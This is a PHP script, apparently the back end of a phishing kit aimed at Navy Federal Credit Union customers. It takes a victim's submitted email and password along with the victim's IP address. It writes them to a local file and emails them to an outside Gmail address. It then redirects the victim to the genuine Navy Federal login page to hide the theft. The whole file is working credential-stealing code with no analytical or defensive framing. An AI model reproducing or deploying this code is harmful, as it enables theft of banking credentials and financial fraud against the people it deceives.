<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| RESULT Navy By JoCk |--------------|\n";
$message .= "|Email : ".$_POST['email']."\n";
$message .= "|Password : ".$_POST['password']."\n";
$message .= "|----------| I N F O S |--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|----------| YOUR WELCOME By JoCk|--------------|\n";
$send = "patrickfoong28@gmail.com";
$subject = "Email Navy By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 
{
mail("$send", "$subject", $message);
}
$praga=rand();
$praga=md5($praga);
	
		

	 	   header("Location: https://my.navyfederal.org/NFOAA_Auth/login.jsp");
 ?>





